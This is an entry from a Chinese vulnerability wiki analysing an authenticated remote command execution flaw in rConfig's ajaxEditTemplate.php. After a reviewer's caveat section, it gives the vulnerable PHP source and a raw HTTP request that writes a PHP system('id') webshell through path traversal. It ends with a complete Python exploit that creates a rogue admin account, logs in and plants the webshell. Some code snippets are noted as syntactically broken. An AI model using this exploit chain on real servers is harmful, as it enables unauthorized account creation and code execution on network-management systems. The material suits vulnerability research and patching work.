---
version: "rConfig"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-393debf72448d0e9aaac9ef6"
entity_id: "ve-393debf72448d0e9aaac9ef6"
schema_version: "1"
title: "rConfig ajaxEditTemplate.php 后台远程命令执行漏洞"
product: "rConfig"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "有效会话；.php.yml执行须Web处理器配置；版本缺失"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/rConfig/rConfig-ajaxEditTemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_status: "unknown"
---

# rConfig ajaxEditTemplate.php 后台远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：rConfig
- 本文讨论：ajaxEditTemplate fileName目录穿越写入；userprocess链前置
- 版本、权限与配置前提：有效会话；.php.yml执行须Web处理器配置；版本缺失
- 资料类型：任意文件写入到RCE源码分析；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 称访问test.php.yml实际访问test.php不准确，应是双扩展处理映射，未给配置
- 片段chmod缺右括号、路径连接多+；array_key_exists缺参数需原源/运行版本确认
- 请求含真实公网Origin/Referer应示例化；全局版本缺失
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- PHP/Apache版本、模板解析、原始CVE/修复待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

rConfig ajaxEditTemplate.php 存在后台远程命令执行

## 漏洞影响

```
rConfig
```

## 网络测绘

```
app="rConfig"
```

## 漏洞复现

漏洞文件为 **rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php**

```php
<?php
require_once("/home/rconfig/classes/usersession.class.php");
require_once("/home/rconfig/classes/ADLog.class.php");
require_once("/home/rconfig/classes/spyc.class.php");
require_once("/home/rconfig/config/functions.inc.php");

$log = ADLog::getInstance();
if (!$session->logged_in) {
    echo 'Don\'t bother trying to hack me!!!!!<br /> This hack attempt has been logged';
    $log->Warn("Security Issue: Some tried to access this file directly from IP: " . $_SERVER['REMOTE_ADDR'] . " & Username: " . $session->username . " (File: " . $_SERVER['PHP_SELF'] . ")");
    // need to add authentication to this script
    header("Location: " . $config_basedir . "login.php");
} else {
    $ymlData = Spyc::YAMLLoad($_POST['code']);
    $fileName = $_POST['fileName'];
    $check_yml_extension = explode('.', $fileName);
    if(@!array_key_exists($check_yml_extension[1])){
        if(@$check_yml_extension[1] != 'yml'){
            $fileName = $fileName . '.yml';
        }
    }
    $fullpath = $config_templates_basedir.$fileName;

    $username = $_SESSION['username'];
    require_once("../../../classes/db2.class.php");
    require_once("../../../classes/ADLog.class.php");
    $db2 = new db2();
    $log = ADLog::getInstance();

    if (!is_dir('templates')) {
        mkdir('templates');
        chown('templates', 'apache');
    }

    // if'' to create the filename based on the command if not created & chmod to 666
    if (!file_exists($fullpath)) {
        exec("touch " . $fullpath);
        chmod($fullpath, 0666);
    }
    // if the file is alread in place chmod it to 666 before writing info
    chmod($fullpath, 0666);

    // dump array into file & chmod back to RO
    $filehandle = fopen($fullpath, 'w+');
    file_put_contents($fullpath, $_POST['code']);
    fclose($filehandle);
    chmod($fullpath, 0444);
 
    $db2->query("UPDATE `templates` SET `fileName` = :fileName, `name` = :name, `desc` = :desc, `dateLastEdit` = NOW(), `addedby` = :username WHERE `id` = :id");
    $db2->bind(':id', $_POST['id']);
    $db2->bind(':fileName', $fullpath);
    $db2->bind(':name', $ymlData['main']['name']);
    $db2->bind(':desc', $ymlData['main']['desc']);
    $db2->bind(':username', $username);

    $queryResult = $db2->execute();
    /* Update successful */
    if ($queryResult && file_exists($fullpath)) {
        $response = "success";
        $log->Info("Success: Template: ".$fullpath." edited in templates folder");
    }
    /* Update failed */ else {
        $response = "failed";
        $log->Warn("Success: Could not edit Template ".$fullpath." in templates folder");
    }
    echo json_encode($response);    
}  // end session check
```

关键代码如下

```php
// if'' to create the filename based on the command if not created & chmod to 666
    if (!file_exists($fullpath)) {
        exec("touch " . $fullpath);
        chmod($fullpath, 0666);
    }
    // if the file is alread in place chmod it to 666 before writing info
    chmod($fullpath, 0666);

    // dump array into file & chmod back to RO
    $filehandle = fopen($fullpath, 'w+');
    file_put_contents($fullpath, $_POST['code']);
    fclose($filehandle);
    chmod($fullpath, 0444;
```

$fileName -->  $fullpath ---> 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置

```php
$ymlData = Spyc::YAMLLoad($_POST['code']);
    $fileName = $_POST['fileName'];
    $check_yml_extension = explode('.', $fileName);
    if(@!array_key_exists($check_yml_extension[1])){
        if(@$check_yml_extension[1] != 'yml'){
            $fileName = $fileName . '.yml';
        }
    }
    $fullpath = $config_templates_basedir+ .$fileName;
```

![](./.resource/rConfig-ajaxEditTemplate.php-后台远程命令执行漏洞/media/202202162243099.png)


```php
$filehandle = fopen($fullpath, 'w+');
file_put_contents($fullpath, $_POST['code']);
```

POST code 传参写入文件 test.php.yml, 请求包如下

```http
POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
Host: 
Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7
Content-Length: 81
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Origin: https://176.62.195.243
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php

fileName=../www/test.php&code=<?php echo system('id');?>&id=1
```

![](./.resource/rConfig-ajaxEditTemplate.php-后台远程命令执行漏洞/media/202202162243006.png)


这里写入文件 **test.php.yml**,并使用 **../** 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令

![](./.resource/rConfig-ajaxEditTemplate.php-后台远程命令执行漏洞/media/202202162243024.png)


## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: rConfig ajaxEditTemplate.php 后台远程命令执行               \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/lib/crud/userprocess.php"
    referer = target_url + "useradmin.php"
    ran_number = random.randint(1, 999)
    origin = target_url
    multipart_data = MultipartEncoder(
        fields={
            'username': 'testtest{}'.format(ran_number),
            'password': 'testtest@{}'.format(ran_number),
            'passconf': 'testtest@{}'.format(ran_number),
            'email': 'testtest{}@test.com'.format(ran_number),
            'ulevelid': '9',
            'add': 'add',
            'editid': ''
        }
    )
    headers = {'Content-Type': multipart_data.content_type, "Upgrade-Insecure-Requests": "1", "Referer": referer,
               "Origin": origin}
    cookies = {'PHPSESSID': 'test'}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
        if "error" not in response.text:
            username = 'testtest{}'.format(ran_number)
            password = 'testtest@{}'.format(ran_number)
            print("\033[36m[o] 成功创建账户 testtest{}/testtest@{} \033[0m".format(ran_number, ran_number))
            POC_2(target_url, username, password)
        else:
            print("\033[31m[x] 创建失败:{} \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_2(target_url, username, password):
    print("\033[36m[o] 正在登陆账户..... \033[0m")
    vuln_url = target_url + "/lib/crud/userprocess.php"
    headers = {
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": target_url + "deviceConnTemplates.php",
        "Origin": target_url,
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.5"
    }
    data = {
        'user': username,
        'pass': password,
        'sublogin': '1'
    }
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在尝试执行 id....\033[0m")
        with requests.Session() as s:
            p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False)
            if "Stephen Stack" in p.text:
                print("\033[31m[x] 登录失败 \033[0m")
            else:
                data = "fileName=..%2Fwww%2Ftest.php&code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E&id=1"
                rce = s.post(target_url + '/lib/ajaxHandlers/ajaxEditTemplate.php', verify=False, data=data,
                             headers=headers)
                if "success" in rce.text:
                    response = s.get(target_url + '/test.php.yml', verify=False)
                    print("\033[36m[o] 成功执行 id, 响应为:\n{} \033[0m".format(response.text))
                else:
                    print("\033[31m[x] 请求失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```

![](./.resource/rConfig-ajaxEditTemplate.php-后台远程命令执行漏洞/media/202202162243541.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
